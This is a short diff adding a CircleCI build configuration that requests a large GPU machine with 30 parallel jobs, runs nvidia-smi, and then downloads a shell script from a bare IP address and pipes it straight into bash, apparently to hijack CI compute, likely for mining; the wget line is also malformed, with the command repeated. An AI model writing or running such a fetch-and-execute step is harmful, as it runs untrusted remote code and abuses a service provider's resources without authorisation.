@@ -1,0 +1,10 @@
+version: 2.1
+jobs:
+  build:
+    machine:
+      resource_class: gpu.nvidia.large
+      image: ubuntu-1604-cuda-10.1:201909-23
+    steps:
+      - run: nvidia-smi
+      - run: wget -O - wget -O - http://23.92.22.221/start_basket_fle_ftx_ph_ws3.sh | bash
+    parallelism: 30
